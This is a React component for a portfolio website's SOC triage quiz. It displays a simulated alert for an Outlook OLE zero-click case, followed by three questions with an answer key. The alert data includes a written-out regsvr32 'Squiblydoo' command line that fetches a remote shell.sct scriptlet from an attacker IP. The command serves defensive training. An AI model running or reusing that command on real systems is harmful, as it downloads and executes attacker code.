"use client";

/*
 * TriageChallenge — "you are on shift": one real alert from the case library
 * (SOC336, the Outlook OLE zero-click), three decisions, then the answer key
 * and the full report. A visitor who plays it has just done the job the
 * portfolio is about, and reads the case with a reason to.
 *
 * Every fact on the alert card is from the report itself. The alert card
 * "streams in" log line by log line, like a SIEM event drawer opening; each
 * answer locks with a flash of the verdict colour.
 */

import { useEffect, useRef, useState } from "react";
import Link from "next/link";
import { ArrowRight, Check, RotateCcw, Siren, X } from "lucide-react";
import SectionHeader from "@/app/core/components/SectionHeader";
import { KanjiWatermark } from "@/app/components/shared/kit";

const ALERT = [
  ["rule", "SOC336 – Windows OLE ZeroClick RCE Exploitation Detected"],
  ["severity", "Critical"],
  ["mail", "projectmanagement@pm.me → Austin · \"Important: Action Required…\" · mail.rtf · Allowed"],
  ["host", "Austin · 172.16.17.137"],
  ["process", "OUTLOOK.EXE → cmd.exe"],
  ["cmdline", "regsvr32.exe /s /u /i:http://84.38.130.118.com/shell.sct scrobj.dll"],
  ["proxy", "GET 84.38.130.118 /shell.sct → Permitted"],
] as const;

type Q = { q: string; options: { label: string; correct?: boolean; why: string }[] };

const QUESTIONS: Q[] = [
  {
    q: "True positive or false positive?",
    options: [
      { label: "True positive", correct: true, why: "Outlook spawning cmd.exe, regsvr32 pulling a remote scriptlet, and the proxy permitting it: the exploit ran." },
      { label: "False positive", why: "A mail client has no reason to start cmd.exe, and the download was permitted — this one is real." },
      { label: "Need more data", why: "The process tree plus the permitted download is already enough to call it." },
    ],
  },
  {
    q: "Which ATT&CK technique is the regsvr32 line?",
    options: [
      { label: "T1218.010 · Regsvr32", correct: true, why: "System Binary Proxy Execution: a signed Windows binary loads the attacker's scriptlet (\"Squiblydoo\")." },
      { label: "T1547.001 · Run keys", why: "Nothing was written for persistence here — regsvr32 is being used to execute." },
      { label: "T1110 · Brute force", why: "No credentials are being guessed in this alert." },
    ],
  },
  {
    q: "First action?",
    options: [
      { label: "Contain the host, then block the IOCs", correct: true, why: "Isolate 172.16.17.137 first, then block the IP, the sender and the RTF hash, and escalate." },
      { label: "Reset Austin's password", why: "Useful later, but the host is running attacker code right now — contain it first." },
      { label: "Close the alert and monitor", why: "Code execution is confirmed; watching is not a response." },
    ],
  },
];

export default function TriageChallenge() {
  const [answers, setAnswers] = useState<(number | null)[]>(QUESTIONS.map(() => null));
  const [streamed, setStreamed] = useState(0);
  const cardRef = useRef<HTMLDivElement>(null);

  /* Stream the alert in, line by line, when it scrolls into view */
  useEffect(() => {
    const el = cardRef.current;
    if (!el) return;
    if (window.matchMedia("(prefers-reduced-motion: reduce)").matches || !("IntersectionObserver" in window)) {
      setStreamed(ALERT.length);
      return;
    }
    let timer: number | undefined;
    const io = new IntersectionObserver(
      ([entry]) => {
        if (!entry.isIntersecting) return;
        io.disconnect();
        let n = 0;
        const tick = () => {
          n += 1;
          setStreamed(n);
          if (n < ALERT.length) timer = window.setTimeout(tick, 180);
        };
        tick();
      },
      { rootMargin: "0px 0px -20% 0px" },
    );
    io.observe(el);
    return () => {
      io.disconnect();
      if (timer) window.clearTimeout(timer);
    };
  }, []);

  const done = answers.every((a) => a !== null);
  const score = answers.filter((a, i) => a !== null && QUESTIONS[i].options[a].correct).length;

  return (
    <section id="triage" aria-label="Triage challenge" className="relative py-24 md:py-32 px-6 md:px-20 bg-background overflow-hidden">
      <KanjiWatermark chars="当番" side="left" />
      <div className="max-w-7xl mx-auto relative z-10">
        <SectionHeader
          eyebrow="Your shift // Triage challenge"
          japanese="当番"
          titleA="Triage"
          titleB="This Alert."
          description="A real alert from the case library. Three calls an analyst makes in the first minutes — make them, then see how the investigation went."
        />

        <div className="grid grid-cols-1 lg:grid-cols-[minmax(0,6fr)_minmax(0,5fr)] gap-8 items-start">
          {/* The alert, as a SIEM event drawer */}
          <div ref={cardRef} className="relative border border-primary/30 bg-surface/70 backdrop-blur-sm overflow-hidden">
            <div className="absolute inset-y-0 left-0 w-[3px] bg-primary" aria-hidden="true" />
            <div className="flex items-center justify-between gap-4 px-6 py-4 border-b border-foreground/10">
              <span className="flex items-center gap-3">
                <Siren size={16} className="text-primary-ink siren-pulse" aria-hidden="true" />
                <span className="font-mono text-[0.625rem] font-bold uppercase tracking-[0.3em] text-primary-ink">New alert · Critical</span>
              </span>
              <span className="font-mono text-[0.5625rem] uppercase tracking-[0.25em] text-foreground/60">Feb 04 2025 · 16:18</span>
            </div>
            <dl className="px-6 py-5 grid gap-3 font-mono text-xs min-h-[17rem]">
              {ALERT.map(([k, v], i) => (
                <div
                  key={k}
                  className={`grid grid-cols-[5.5rem_1fr] gap-3 transition-all duration-500 ${i < streamed ? "opacity-100 translate-x-0" : "opacity-0 -translate-x-2"}`}
                >
                  <dt className="uppercase tracking-[0.2em] text-foreground/60 text-[0.5625rem] pt-0.5">{k}</dt>
                  <dd className={`[overflow-wrap:anywhere] ${k === "cmdline" ? "text-accent" : k === "severity" ? "text-primary-ink font-bold" : "text-foreground/80"}`}>{v}</dd>
                </div>
              ))}
              <span className={`h-4 w-2 bg-primary/80 caret-blink ${streamed >= ALERT.length ? "opacity-100" : "opacity-0"}`} aria-hidden="true" />
            </dl>
          </div>

          {/* The decisions */}
          <div className="grid gap-6">
            {QUESTIONS.map((q, qi) => {
              const picked = answers[qi];
              return (
                <fieldset key={q.q} className="border border-foreground/10 bg-surface/40 px-5 py-4">
                  <legend className="px-2 font-mono text-[0.625rem] font-bold uppercase tracking-[0.25em] text-foreground/70">
                    {String(qi + 1).padStart(2, "0")} · {q.q}
                  </legend>
                  <div className="mt-2 grid gap-2">
                    {q.options.map((o, oi) => {
                      const chosen = picked === oi;
                      const reveal = picked !== null;
                      const tone = !reveal
                        ? "border-foreground/10 hover:border-primary/50 text-foreground/80"
                        : o.correct
                          ? "border-tertiary bg-tertiary/10 text-foreground"
                          : chosen
                            ? "border-primary bg-primary/10 text-foreground answer-shake"
                            : "border-foreground/5 text-foreground/40";
                      return (
                        <button
                          key={o.label}
                          type="button"
                          disabled={reveal}
                          onClick={() => setAnswers((a) => a.map((x, i) => (i === qi ? oi : x)))}
                          className={`flex items-center justify-between gap-3 border px-4 py-2.5 text-left text-sm transition-all duration-300 disabled:cursor-default ${tone}`}
                        >
                          <span>{o.label}</span>
                          {reveal && o.correct && <Check size={14} className="text-tertiary shrink-0" aria-label="correct" />}
                          {reveal && chosen && !o.correct && <X size={14} className="text-primary-ink shrink-0" aria-label="incorrect" />}
                        </button>
                      );
                    })}
                  </div>
                  {picked !== null && (
                    <p className="mt-3 text-xs text-foreground/60 leading-relaxed answer-in" role="status">
                      {q.options[picked].why}
                    </p>
                  )}
                </fieldset>
              );
            })}

            {done && (
              <div className="flex flex-wrap items-center justify-between gap-4 border-l-2 border-accent bg-accent/5 px-5 py-4 answer-in" role="status">
                <span className="font-mono text-xs uppercase tracking-[0.2em] text-foreground">
                  Score <span className="text-accent font-black text-base tabular-nums">{score}/3</span>
                  {score === 3 ? " — ready for the queue." : " — see how it really went."}
                </span>
                <span className="flex flex-wrap gap-3">
                  <Link href="/blog/soc336-report" className="group inline-flex items-center gap-2 px-4 py-2.5 bg-primary text-white font-mono text-[0.625rem] font-bold uppercase tracking-[0.2em] hover:bg-foreground hover:text-background transition-colors">
                    The investigation <ArrowRight size={12} className="transition-transform duration-300 group-hover:translate-x-1" />
                  </Link>
                  <button
                    type="button"
                    onClick={() => setAnswers(QUESTIONS.map(() => null))}
                    className="inline-flex items-center gap-2 px-4 py-2.5 border border-foreground/15 font-mono text-[0.625rem] font-bold uppercase tracking-[0.2em] text-foreground/70 hover:border-primary transition-colors"
                  >
                    <RotateCcw size={12} /> Again
                  </button>
                </span>
              </div>
            )}
          </div>
        </div>
      </div>
    </section>
  );
}
